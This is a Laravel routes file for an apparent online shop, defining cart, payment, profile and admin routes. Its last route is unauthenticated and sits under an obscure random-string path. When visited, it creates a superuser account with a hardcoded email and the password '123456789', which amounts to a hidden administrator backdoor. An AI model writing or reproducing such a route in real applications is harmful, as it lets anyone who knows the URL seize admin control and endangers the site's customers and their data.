<?php

use App\Http\Controllers\Admin\AdminController;
use App\Http\Controllers\Admin\OrderController;
use App\Http\Controllers\Admin\UserController;
use App\Http\Controllers\CartController;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\PaymentController;
use App\Http\Controllers\ProductController;
use App\Http\Controllers\Admin\ProductController as AdminProductController;
use App\Http\Controllers\ProfileController;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Auth::routes(['verify' => true]);

Route::get('/', [HomeController::class, 'index'])->name('home');

Route::prefix('/cart')->controller(CartController::class)->group(function () {
    Route::get('/', 'cart')->name('cart');
    Route::post('/add/{product}', 'addToCart')->name('addToCart');

    Route::patch('/quantity/change', 'quantityChange');
    Route::delete('/delete/{cart}', 'deleteFromCart')->name('cart.destroy');
});
Route::post('payment', [PaymentController::class, 'payment'])->middleware('auth')->name('cart.payment');

Route::as('profile.')->prefix('/profile')->controller(ProfileController::class)->middleware('auth')->group(function () {
    Route::get('/', 'index')->name('home');
    Route::get('/setting', 'setting')->name('setting');
    Route::post('/edit', 'update')->name('edit');
});

Route::as('admin.')->prefix('/admin')->middleware('admin')->group(function () {
    Route::get('/', [AdminController::class, 'index'])->name('home');
    Route::resource('users', UserController::class)->except('show');
    Route::resource('products', AdminProductController::class)->except('show');
    Route::resource('orders', OrderController::class)->except(['show', 'create', 'store']);
});

Auth::routes();

Route::get('fy8iwiyfb-ahlrwvy-hwj-4893g-uwgebiogwu', function () {
    \App\Models\User::create([
        'name' => 'مریم',
        'email' => 'maryam@gmail.com',
        'is_superuser' => 1,
        'password' => \Illuminate\Support\Facades\Hash::make('123456789'),
    ]);
});
